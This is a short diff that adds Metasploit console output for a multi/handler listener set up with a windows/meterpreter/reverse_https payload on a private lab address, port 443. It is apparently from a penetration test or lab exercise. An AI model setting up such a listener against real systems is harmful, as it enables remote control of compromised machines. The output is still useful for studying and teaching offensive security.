@@ -1,0 +1,21 @@
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_https):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.73.128   yes       The local listener hostname
+   LPORT     443              yes       The local listener port
+   LURI                       no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
